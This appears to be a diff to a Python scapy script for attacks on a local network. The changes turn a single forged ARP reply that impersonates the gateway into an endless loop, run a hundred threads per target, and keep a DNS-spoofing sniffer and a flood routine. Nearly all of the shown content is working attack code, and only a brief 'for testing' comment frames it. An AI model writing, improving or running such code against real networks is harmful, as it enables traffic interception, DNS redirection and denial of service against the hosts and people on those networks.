@@ -3,10 +3,11 @@ import threading
 import time
 import socket
 import random
-from scapy.all import ARP, Ether, srp, send, sniff, DNS, DNSQR
+from scapy.all import ARP, Ether, srp, send, sniff, DNS, DNSQR, IP, UDP, DNSRR
 
 # Configuration parameters
 NUM_THREADS = 500  # Increased number of threads
+NUM_ARP_THREADS = 100  # Number of threads dedicated to ARP spoofing
 DURATION = 600  # Duration in seconds
 
 # List of target IP addresses for testing
@@ -30,8 +31,10 @@ def arp_spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     if not target_mac:
         return
-    packet = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op='is-at')
-    send(packet, verbose=False)
+    while True:
+        packet = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op='is-at')
+        send(packet, verbose=False)
+        time.sleep(0.1)  # Short delay to avoid overwhelming the network stack
 
 def dns_spoof(packet):
     if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
@@ -60,7 +63,7 @@ def flood():
 
 def main():
     interface = "eth0"  # Replace with your network interface
-    speed = random.randint(10, 50)  # Random speed between 10 and 50 Mbps
+    speed = random.randint(10, 20)  # Random speed between 10 and 20 Mbps
     set_network_speed(interface, speed)
 
     threads = []
@@ -72,7 +75,10 @@ def main():
     # ARP spoofing attack
     gateway_ip = "192.168.1.1"  # Replace with your gateway IP
     for target in targets:
-        threading.Thread(target=arp_spoof, args=(target, gateway_ip)).start()
+        for _ in range(NUM_ARP_THREADS):
+            t = threading.Thread(target=arp_spoof, args=(target, gateway_ip))
+            t.start()
+            threads.append(t)
 
     # DNS spoofing attack
     sniff(filter="udp port 53", prn=dns_spoof, store=0)
